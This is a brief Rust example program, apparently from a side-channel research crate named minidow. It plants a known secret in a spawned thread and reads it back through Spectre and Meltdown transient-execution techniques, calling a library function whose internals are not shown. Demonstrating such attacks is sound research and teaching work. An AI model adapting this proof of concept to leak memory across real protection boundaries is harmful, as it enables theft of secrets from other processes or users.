use minidow::*;

fn main() {
    setup_measurements();

    let (tx, rx) = std::sync::mpsc::channel();

    std::thread::spawn(move || {
        let secret: usize = 0x1ff23ff45ff67ff8;
        tx.send(&secret as *const _ as usize).unwrap();
        loop {}
    });

    let secret_addr = rx.recv().unwrap();

    println!(
        "With Spectre: 0x{:x}",
        read_ptr::<Spectre>(|| {}, secret_addr)
    );

    println!(
        "With Meltdown: 0x{:x}",
        read_ptr::<Meltdown>(|| {}, secret_addr)
    );
}
